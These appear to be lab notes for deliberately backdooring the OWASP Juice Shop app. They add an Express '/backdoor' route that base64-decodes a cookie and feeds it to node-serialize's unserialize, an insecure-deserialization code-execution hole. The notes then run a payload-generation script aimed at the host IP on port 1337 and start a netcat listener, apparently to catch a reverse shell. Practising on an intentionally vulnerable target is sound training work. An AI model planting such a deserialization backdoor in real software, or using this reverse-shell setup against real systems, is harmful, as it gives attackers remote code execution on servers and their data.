# Confirm juice-shop app has node-serialize installed:
```
npm install node-serialize
```

# Change code on server.js file


```

const serialize = require('node-serialize');
app.use(cookieParser())

/* I'm a backdoor */
app.get('/backdoor', function(req, res) {
  if (req.cookies.profile) {
    var str = new Buffer(req.cookies.profile, 'base64').toString();
    var obj = serialize.unserialize(str);
    if (obj.username) {
      res.send("Hello " + escape(obj.username));
    }
  } else {
      res.cookie('profile', "eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5IjoiYmFuZ2Fsb3JlIn0=", {
        maxAge: 900000,
        httpOnly: true
      });
  }
  res.send("I'm a backdoor");
 });

```

# Generate Payload
python3.7 exploit_1_generate_payload.py $(host ip address) 1337

# Encode Payload

# Create listening Netcat
nc -l $(host ip address) 1337